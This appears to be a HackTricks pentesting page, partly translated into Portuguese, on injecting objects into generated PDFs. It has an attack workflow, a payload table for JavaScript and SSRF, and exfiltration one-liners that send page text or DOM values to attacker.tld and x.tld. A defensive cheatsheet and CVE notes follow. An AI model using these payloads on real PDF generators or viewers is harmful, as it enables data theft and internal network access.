# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**Se sua entrada está sendo refletida dentro de um arquivo PDF, você pode tentar injetar dados de PDF para executar JavaScript, realizar SSRF ou roubar o conteúdo do PDF.**
A sintaxe do PDF é extremamente permissiva – se você conseguir sair da string ou dicionário que está incorporando sua entrada, pode anexar objetos totalmente novos (ou novas chaves no mesmo objeto) que o Acrobat/Chrome vai analisar sem problemas.
Desde 2024 uma onda de relatórios de bug-bounty mostrou que *um parêntese não escapado ou uma barra invertida é suficiente* para execução total de scripts.

## TL;DR – Fluxo de Ataque Moderno (2024-2026)
1. Encontre qualquer valor controlado pelo usuário que termine dentro de um **(parenthesis string)**, `/URI ( … )` ou `/JS ( … )` field in the generated PDF.
2. Injete `)` (fechando a string) seguido por um dos primitivos abaixo e termine com outro parêntese de abertura para manter a sintaxe válida.
3. Entregue o PDF malicioso a uma vítima (ou a um serviço backend que renderize automaticamente o arquivo – ótimo para bugs cegos).
4. Seu payload é executado no visualizador de PDF:
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (veja CVE-2024-4367)
* Acrobat → API JavaScript completa (pode exfiltrar conteúdos arbitrários de arquivos com `this.getPageNthWord`)

Example (annotation link hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*O primeiro `)` fecha a string URI original, então adicionamos um novo dicionário **Action** que o Acrobat executará quando o usuário clicar no link.*

## Primitivos úteis de injeção
| Objetivo | Payload Snippet | Notas |
|------|-----------------|-------|
| **JavaScript on open** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Executa instantaneamente quando o documento é aberto (funciona no Acrobat, não no Chrome). |
| **JavaScript on link** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | Funciona no PDFium & Acrobat se você controlar uma anotação `/Link`. |
| **Blind data exfiltration** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | Combine com `this.getPageNthWord` dentro de JS para exfiltrar conteúdo. |
| **Server-Side SSRF** | Same as above but target an internal URL – great when the PDF is rendered by back-office services that honour `/URI`. |
| **Additional Actions (/AA)** | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | Anexe a um Page/Annotation/Form dictionary para executar na abertura/foco. |
| **Line Break for new objects** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | Se a biblioteca permitir injetar caracteres de nova linha, você pode criar objetos totalmente novos. |

## Ações incorporadas como alvos de injeção
PDF viewers treat **ações incorporadas** such as `/OpenAction` and `/AA` (Ações Adicionais) as first-class features that can run when a document opens or when a specific event fires. If you can inject into any dictionary that accepts actions (Catalog, Page, Annotation, or Form field), you can graft an `/AA` tree and trigger JavaScript on open/focus.

Example payload for **generator-side object injection** (feche a string/dictionary original e injete `/AA`):
```pdf
) >> /AA << /O << /S /JavaScript /JS (app.alert('AA fired')) >> >> (
```
This pattern matches recent jsPDF issues where attacker-controlled input passed into `addJS` (or certain AcroForm fields) breaks out of the intended JavaScript string and injects an **Additional Action** dictionary.

## Blind Enumeration Trick
Gareth Heyes (PortSwigger) lançou um comando de uma linha que enumera every object inside an unknown document – útil quando você cannot see the generated PDF:
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
O código itera sobre o Acrobat DOM e realiza requisições de saída para cada par propriedade/valor, fornecendo um dump *JSON-ish* do arquivo. Veja o white-paper “Portable Data **ex**Filtration” para a técnica completa.

## Vulnerabilidades Reais (2023-2026)
* **CVE-2026-25755** – jsPDF `addJS` PDF object injection: strings controladas pelo atacante podem fechar o literal JS e injetar ações `/AA` → `/O` → `/JavaScript` que disparam ao abrir/focar.
* **CVE-2024-4367** – Arbitrary JavaScript execution in Firefox’s PDF.js prior to 4.2.67 contornou o sandbox com uma ação `/JavaScript` construída.
* **Bug bounty 2024-05** – Uma grande fintech permitiu notas de fatura fornecidas por clientes que acabaram em `/URI`; relatório recebeu $10k após demonstração de SSRF para um host de metadata interno usando `file:///` URI.
* **CVE-2023-26155** – `node-qpdf` command-injection via unsanitised PDF path mostra a importância de escapar backslashes e parênteses mesmo *before* da camada PDF.

## Cheatsheet defensivo
1. **Nunca concatene input bruto do usuário** dentro de strings ou nomes `(`…`)`. Escape `\`, `(`, `)` conforme exigido pela §7.3 da especificação PDF ou use hex strings `<...>`.
2. Se você constrói links, prefira `/URI (https://…)` que você codifique totalmente a URL; bloqueie esquemas `javascript:` nos visualizadores no cliente.
3. Remova ou valide dicionários `/OpenAction`, `/AA` (additional actions), `/Launch`, `/SubmitForm` e `/ImportData` ao pós-processar PDFs.
4. No lado do servidor, renderize PDFs não confiáveis com um *headless converter* (e.g. qpdf –decrypt –linearize) que remova JavaScript e ações externas.
5. Mantenha os visualizadores de PDF atualizados; PDF.js < 4.2.67 e Acrobat Reader antes dos patches de julho de 2024 permitem execução trivial de código.
6. Se você usar geradores client-side (e.g., jsPDF), nunca passe entrada não confiável para `addJS` ou setters de AcroForm que terminem dentro de dicionários de ação do PDF.

## Referências
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research (atualizado May 2024). <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (Apr 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
* GitLab Advisory Database, “CVE-2026-25755: jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method” (Feb 2026). <https://advisories.gitlab.com/pkg/npm/jspdf/CVE-2026-25755/>
* Adobe Acrobat Help, “Acrobat shows a warning message when signing documents” (Sep 2025) – embedded actions like OpenAction/AA. <https://helpx.adobe.com/acrobat/kb/embedded-action-signing-warning.html>
{{#include ../../banners/hacktricks-training.md}}
